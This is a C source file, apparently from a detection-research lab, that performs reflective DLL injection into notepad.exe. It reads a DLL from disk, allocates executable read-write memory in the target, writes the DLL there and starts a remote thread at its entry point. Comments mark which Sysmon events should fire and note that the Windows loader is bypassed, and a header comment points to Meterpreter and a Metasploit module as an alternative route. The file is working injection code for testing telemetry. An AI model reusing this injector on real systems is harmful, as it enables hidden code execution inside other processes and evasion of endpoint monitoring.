// Issue getting this code to work, instead:  1. Meterspreter session on target 2. Get DLL from https://github.com/stephenfewer/ReflectiveDLLInjection 3. Metasploit module windows/manage/reflective_dll_inject

// Check PE entry point of the DLL
// $bytes = [System.IO.File]::ReadAllBytes("C:\Users\jens\Documents\procInj\reflective_dll.x64.dll")
// $e_lfanew = [BitConverter]::ToInt32($bytes, 0x3c)
// $ep = [BitConverter]::ToInt32($bytes, $e_lfanew + 0x28)
// Write-Host "Entry point offset: 0x$($ep.ToString('X'))"
#include "common.h"

int main() {
    HANDLE hFile = CreateFileA(
        "C:\\Users\\jens\\Documents\\procInj\\reflective_dll.x64.dll",
        GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] Failed to open DLL: %lu\n", GetLastError());
        return 1;
    }

    DWORD dllSize = GetFileSize(hFile, NULL);
    PBYTE dllBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dllSize);
    DWORD bytesRead = 0;
    ReadFile(hFile, dllBuffer, dllSize, &bytesRead, NULL);
    CloseHandle(hFile);
    wprintf(L"[+] DLL loaded: %lu bytes\n", dllSize);

    // Get entry point from PE headers
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBuffer;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PBYTE)dllBuffer + dos->e_lfanew);
    DWORD epOffset = nt->OptionalHeader.AddressOfEntryPoint;
    wprintf(L"[+] Entry point offset: 0x%08X\n", epOffset);

    DWORD pid = GetPID(L"notepad.exe");
    if (!pid) {
        wprintf(L"[-] notepad.exe not found\n");
        return 1;
    }
    wprintf(L"[*] Target PID: %lu\n", pid);

    DWORD accessMask = PROCESS_VM_WRITE      |
                       PROCESS_VM_OPERATION  |
                       PROCESS_CREATE_THREAD |
                       PROCESS_QUERY_INFORMATION;
    wprintf(L"[+] Requested access mask: 0x%08X\n", accessMask);

    // EID 10 fires here
    HANDLE hProc = OpenProcess(accessMask, FALSE, pid);
    if (!hProc) {
        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Handle acquired\n");

    // Allocate RWX for entire DLL
    LPVOID remoteMem = VirtualAllocEx(
        hProc, NULL, dllSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!remoteMem) {
        wprintf(L"[-] VirtualAllocEx failed\n");
        return 1;
    }
    wprintf(L"[+] Remote RWX memory: 0x%p\n", remoteMem);

    // Write entire DLL bytes
    SIZE_T written = 0;
    WriteProcessMemory(hProc, remoteMem, dllBuffer, dllSize, &written);
    wprintf(L"[+] DLL written: %zu bytes\n", written);

    // Calculate entry point in remote process
    LPVOID epAddr = (LPVOID)((ULONG_PTR)remoteMem + epOffset);
    wprintf(L"[+] Remote entry point: 0x%p\n", epAddr);

    // EID 8 fires here
    // StartModule: - confirms anonymous RWX memory
    // EID 7 should NOT fire — Windows loader bypassed
    HANDLE hThread = CreateRemoteThread(
        hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)epAddr,
        remoteMem,  // pass base as argument — needed by reflective loader
        0, NULL
    );
    if (!hThread) {
        wprintf(L"[-] CreateRemoteThread failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Remote thread created\n");
    wprintf(L"[*] EID 8 StartModule should show - \n");
    wprintf(L"[*] EID 7 should NOT fire\n");
    wprintf(L"[*] MessageBox should appear in notepad context\n");

    HeapFree(GetProcessHeap(), 0, dllBuffer);
    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
